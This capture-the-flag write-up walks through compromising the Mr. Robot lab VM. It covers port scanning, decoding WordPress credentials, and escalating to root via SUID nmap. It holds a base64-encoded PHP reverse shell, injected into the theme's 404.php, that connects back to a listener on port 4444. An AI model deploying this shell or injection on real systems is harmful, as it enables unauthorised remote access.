<img width="907" height="568" alt="image" src="https://github.com/user-attachments/assets/8869cd4e-cace-4073-bb0f-9d68f44bea03" />


# CTF Writeup: Mr. Robot VM

**Target IP:** `10.48.134.207`

**Difficulty:** Beginner/Intermediate

**Objective:** Capture 3 hidden keys and gain root access.

## Phase 1: Reconnaissance & Enumeration

### 1. Port Scanning

The initial scan was performed using `nmap` to identify open services:

```sql
nmap -sV -sC -Pn 10.48.134.207
```

<img width="937" height="426" alt="image" src="https://github.com/user-attachments/assets/b6521074-8949-4929-9e8c-2b95c65b2f6a" />

**Results:**

- **Port 80/443 (HTTP/HTTPS):** Apache web server.
- **Port 22 (SSH):** Open, but often a rabbit hole in this specific machine.

### 2. Directory Brute-Forcing

Using `gobuster`, we identified several interesting directories:

```sql
gobuster dir -u http://10.48.134.207 -w /usr/share/wordlists/dirb/common.txt
```

<img width="942" height="762" alt="image" src="https://github.com/user-attachments/assets/5ebc7216-adfd-4522-a0d6-369af134dfe7" />

<img width="943" height="296" alt="image" src="https://github.com/user-attachments/assets/79fb81a1-3ff7-4ebc-92dc-fb68c249f462" />

**Key Findings:**

- `/robots.txt`: Revealed the location of **Key 1** and a dictionary file `fsocity.dic`.
- `/license`: Contained a Base64 encoded string at the bottom.
- `/wp-login.php`: Confirmed the site is running WordPress.

<img width="505" height="172" alt="image" src="https://github.com/user-attachments/assets/651720b9-390e-45e4-9f11-a7115deed04b" />

## Phase 2: Initial Access

### 1. Decoding Credentials

By checking `http://10.48.134.207/license`, we found the string `ZWxsaW90OkVSMjgtMDY1Mgo=`.

<img width="918" height="107" alt="image" src="https://github.com/user-attachments/assets/e7ba52aa-e1fa-4e64-a931-578632753475" />

<img width="517" height="76" alt="image" src="https://github.com/user-attachments/assets/e14a0da9-30a7-480e-a35d-11aafcf650a7" />

### 2. Exploiting WordPress (Reverse Shell)

Using the credentials `elliot : ER28-0652`, we accessed the WordPress dashboard.

Navigated to **Appearance > Editor > 404.php**.

<img width="1278" height="747" alt="image" src="https://github.com/user-attachments/assets/32527609-111c-450d-b511-5225c86f3b4a" />

```sql
PD9waHAKJGlwID0gJzE5Mi4xNjguMjE5LjE0Myc7ICAvLyBZb3VyIEthbGkgVlBOIElQCiRwb3J0ID0gNDQ0NDsgICAgICAgICAgICAgLy8gVGhlIHBvcnQgeW91IGFyZSBsaXN0ZW5pbmcgb24KCiRjaHVua19zaXplID0gMTQwMDsKJHdyaXRlX2EgPSBudWxsOwokZXJyb3JfYSA9IG51bGw7CiRzaGVsbCA9ICd1bmFtZSAtYTsgdzsgaWQ7IC9iaW4vc2ggLWknOwokZGFlbW9uID0gMDsKJGRlYnVnID0gMDsKCmlmIChmdW5jdGlvbl9leGlzdHMoJ3BjbnRsX2ZvcmsnKSkgewoJJHBpZCA9IHBjbnRsX2ZvcmsoKTsKCWlmICgkcGlkID09IC0xKSB7CgkJcHJpbnRpdCgiRVJST1I6IENhbid0IGZvcmsiKTsKCQlleGl0KDEpOwoJfQoJaWYgKCRwaWQpIHsKCQlleGl0KDApOyAgLy8gUGFyZW50IGV4aXRzCgl9CglpZiAocG9zaXhfc2V0c2lkKCkgPT0gLTEpIHsKCQlwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0IHNpZCIpOwoJCWV4aXQoMSk7Cgl9CgkkZGFlbW9uID0gMTsKfSBlbHNlIHsKCXByaW50aXQoIldBUk5JTkc6IHBjbnRsX2Zvcmsgbm90IHN1cHBvcnRlZCwgZGFlbW9uaXppbmcgZmFpbGVkIik7Cn0KCmNoZGlyKCIvIik7CnVtYXNrKDApOwoKJHNvY2sgPSBmc29ja29wZW4oJGlwLCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCAzMCk7CmlmICghJHNvY2spIHsKCXByaW50aXQoIiRlcnJzdHIgKCRlcnJubykiKTsKCWV4aXQoMSk7Cn0KCiRkZXNjcmlwdG9yc3BlYyA9IGFycmF5KAogICAwID0+IGFycmF5KCJwaXBlIiwgInIiKSwgIC8vIHN0ZGluIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHJlYWQgZnJvbQogICAxID0+IGFycmF5KCJwaXBlIiwgInciKSwgIC8vIHN0ZG91dCBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwogICAyID0+IGFycmF5KCJwaXBlIiwgInciKSAgIC8vIHN0ZGVyciBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwopOwoKJHByb2Nlc3MgPSBwcm9jX29wZW4oJHNoZWxsLCAkZGVzY3JpcHRvcnNwZWMsICRwaXBlcyk7CgppZiAoIWlzX3Jlc291cmNlKCRwcm9jZXNzKSkgewoJcHJpbnRpdCgiRVJST1I6IENhbid0IHNwYXduIHNoZWxsIik7CglleGl0KDEpOwp9CgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1swXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzFdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMl0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrLCAwKTsKCnByaW50aXQoIlN1Y2Nlc3NmdWxseSBvcGVuZWQgcmV2ZXJzZSBzaGVsbCB0byAkaXA6JHBvcnQiKTsKCndoaWxlICgxKSB7CglpZiAoZmVvZigkc29jaykpIHsKCQlwcmludGl0KCJFUlJPUjogU2hlbGwgY29ubmVjdGlvbiB0ZXJtaW5hdGVkIik7CgkJYnJlYWs7Cgl9CgoJaWYgKGZlb2YoJHBpcGVzWzFdKSkgewoJCXByaW50aXQoIkVSUk9SOiBTaGVsbCBwcm9jZXNzIHRlcm1pbmF0ZWQiKTsKCQlicmVhazsKCX0KCgkkcmVhZF9hID0gYXJyYXkoJHNvY2ssICRwaXBlc1sxXSwgJHBpcGVzWzJdKTsKCSRudW1fY2hhbmdlZF9zb2NrZXRzID0gc3RyZWFtX3NlbGVjdCgkcmVhZF9hLCAkd3JpdGVfYSwgJGVycm9yX2EsIG51bGwpOwoKCWlmIChpbl9hcnJheSgkc29jaywgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkc29jaywgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNPQ0s6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkcGlwZXNbMF0sICRpbnB1dCk7Cgl9CgoJaWYgKGluX2FycmF5KCRwaXBlc1sxXSwgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQgUkVBRCIpOwoJCSRpbnB1dCA9IGZyZWFkKCRwaXBlc1sxXSwgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVDogJGlucHV0Iik7CgkJZndyaXRlKCRzb2NrLCAkaW5wdXQpOwoJfQoKCWlmIChpbl9hcnJheSgkcGlwZXNbMl0sICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMl0sICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlI6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCX0KfQoKZmNsb3NlKCRzb2NrKTsKZmNsb3NlKCRwaXBlc1swXSk7CmZjbG9zZSgkcGlwZXNbMV0pOwpmY2xvc2UoJHBpcGVzWzJdKTsKcHJvY19jbG9zZSgkcHJvY2Vzcyk7CgpmdW5jdGlvbiBwcmludGl0ICgkc3RyaW5nKSB7CglpZiAoISRHTE9CQUxTWydkYWVtb24nXSkgewoJCXByaW50ICIkc3RyaW5nXG4iOwoJfQp9Cgo/Pg==
```

- Injected a **PHP Reverse Shell** configured to listener IP `192.168.219.143` on port `4444`.
- Started a listener: `nc -lvnp 4444`.
- Triggered the shell by visiting the `404.php` path, gaining access as the `daemon` user.

<img width="921" height="197" alt="image" src="https://github.com/user-attachments/assets/95e4f71d-15e9-4d59-aff6-71028d12c0d9" />

## Phase 3: Privilege Escalation (User: Robot)

### 1. Capturing Key 2

Navigated to `/home/robot` and found two files: `key-2-of-3.txt` and `password.raw-md5`.

<img width="687" height="262" alt="image" src="https://github.com/user-attachments/assets/2e565e9c-87e2-4597-a607-d9eb13a6cf62" />

The MD5 hash `c3fcd3d76192e4007dfb496cca67e13b` was cracked to reveal the password: **`abcdefghijklmnopqrstuvwxyz`**

<img width="1265" height="502" alt="image" src="https://github.com/user-attachments/assets/3f962f15-3d82-49bc-8baa-56acd78c494a" />

### 2. Horizontal Escalation

<img width="590" height="145" alt="image" src="https://github.com/user-attachments/assets/1755bda3-57f9-4057-a486-edb275c785f1" />

## Phase 4: Root Escalation (The Final Key)

### 1. SUID Enumeration

We searched for binaries with SUID permissions to find a path to root:

<img width="836" height="307" alt="image" src="https://github.com/user-attachments/assets/f7354ffb-2860-4a22-be73-2e3372b4cb38" />

The search identified `/usr/local/bin/nmap` (v3.81).
****

### 2. Exploiting Nmap SUID

Older versions of Nmap allow an interactive mode that can execute shell commands with root privileges.

<img width="560" height="130" alt="image" src="https://github.com/user-attachments/assets/6b27f536-fbe8-4e25-8239-9991ad64bbbb" />

### 3. Capturing Key 3

Navigated to the root directory to claim the final flag:
<img width="752" height="50" alt="image" src="https://github.com/user-attachments/assets/ed8c74ee-f4d7-47cb-bef9-78c556c3fb47" />
